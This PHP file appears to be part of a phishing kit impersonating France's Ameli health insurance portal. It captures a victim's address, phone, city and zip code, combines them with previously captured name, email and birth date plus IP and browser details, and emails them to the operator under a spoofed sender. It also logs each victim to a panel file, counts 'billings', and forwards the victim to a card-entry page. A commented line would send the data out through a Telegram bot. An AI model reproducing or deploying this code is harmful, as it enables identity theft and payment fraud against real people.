<?php
ob_start();
session_start();
include("../config.php");

if ($_SERVER['REQUEST_METHOD'] == 'POST') {

    $Adresse = $_POST['input_adresse'];
    $Complementdadresse = $_POST['input_adresse2'];
    $zipcode = $_POST['input_zipcode'];
    $Tel = $_POST['input_tel'];
    $City = $_POST['input_city'];

    $_SESSION['adresse']  = $Adresse;
    $_SESSION['adresse2']  = $Complementdadresse;
    $_SESSION['input_zipcode']  = $zipcode;
    $_SESSION['tel']  = $Tel;
    $_SESSION['city']  = $City;

  setlocale(LC_TIME, 'fr_FR');
  date_default_timezone_set('Europe/Paris');
  $heure = date("H:i:s");
  $date = date("d/m/Y");
  
  $os = 'Unknown';
  $user_agent = $_SERVER['HTTP_USER_AGENT'];
  if (strpos($user_agent, 'Windows') !== false) $os = 'Windows';
  elseif (strpos($user_agent, 'Mac') !== false) $os = 'macOS';
  elseif (strpos($user_agent, 'Linux') !== false) $os = 'Linux';
  elseif (strpos($user_agent, 'iPhone') !== false) $os = 'iPhone';
  elseif (strpos($user_agent, 'Android') !== false) $os = 'Android';
  
  $browser = 'Unknown';
  if (strpos($user_agent, 'Chrome') !== false) $browser = 'Chrome';
  elseif (strpos($user_agent, 'Safari') !== false) $browser = 'Safari';
  elseif (strpos($user_agent, 'Firefox') !== false) $browser = 'Firefox';
  elseif (strpos($user_agent, 'Edge') !== false) $browser = 'Edge';

  $message = '
🏠 ADDRESS INFO 🏠

👮 Nom : '.$_SESSION['Nom'].'
🧑‍🚒 Prénom : '.$_SESSION['Prenom'].'
💌 Email : '.$_SESSION['mail'].'
📅 Date de naissance : '.$_SESSION['Ddn'].'

📱 Téléphone : '.$_SESSION['tel'].'

🏡 Adresse : '.$_SESSION['adresse'].'
🏡 Complément : '.$_SESSION['adresse2'].'

🏙️ Ville : '.$_SESSION['city'].'
📮 Code Postal : '.$_SESSION['input_zipcode'].'

🚩 Pays : France

🛒 Adresse IP : '.$_SERVER['REMOTE_ADDR'].'
💻 Système d\'exploitation : ' . $os . '
🌐 Navigateur : ' . $browser . '
⏰ Heure : ' . $heure . ' ' . $date . '
';

if ($mail_send == true) {
  $Subject = " 「💳」+1 Moritz zimmerman Ameli adresse from " . $_SESSION["city"] . " | " . $_SERVER['REMOTE_ADDR'];
  $head = "From: Ameli adresse <info@querty.bg>";

  mail($my_mail, $Subject, $message, $head);
}

// Telegram envoyé seulement après la carte complète
// if ($tlg_send == true) {
//   file_get_contents('https://api.telegram.org/bot' . $bot_token . '/sendMessage?chat_id=' . $rez_billing . '&text=' . urlencode("$message") . '');
// }

setlocale(LC_TIME, 'fr_FR');
date_default_timezone_set('Europe/Paris');

$date = date("d/m/Y");
$heure = date("H:i:s");

$myfile = fopen("../panel/billing.txt", "a") or die("Unable to open file!");
fwrite($myfile, "\n" . '
<tr>
<td width="80">
<p align="center">'.$_SERVER['REMOTE_ADDR'].'</th>
<td width="60">
<p align="center">'.$_SESSION['Prenom'] . ' ' .$_SESSION['Nom'].' </th>
<td width="60">
<p align="center">'.$_SESSION['Ddn'].' </th>
<td width="30">
<p align="center">'.$_SESSION['tel'].' </th>
<td width="30">
<p align="center">'.$_SESSION['city'].' </th>
<td width="30">
<p align="center">'.$_SESSION['adresse'].' </th>
<td width="30">
<p align="center">'.$_SESSION['input_zipcode'].' </th>
<td width="30">
<p align="center">'.$_SESSION['mail'].'</th>
<td width="40">
</font></th></tr>
');
fclose($myfile);

$filepath = '../panel/stats.ini';
$data = @parse_ini_file($filepath);
$data['billings']++;
            function update_ini_file($data, $filepath) {
              $content = "";
              $parsed_ini = parse_ini_file($filepath, true);
              foreach($data as $section => $values){
                if($section === ""){
                  continue;
                }
                $content .= $section ."=". $values . "\n\r";
              }
              if (!$handle = fopen($filepath, 'w')) {
                return false;
              }
              $success = fwrite($handle, $content);
              fclose($handle);
            }
update_ini_file($data, $filepath);

header('Location: ../pages/avcard.php');
ob_end_clean();
exit();
}

header('Location: ../pages/adresse.php');
exit();
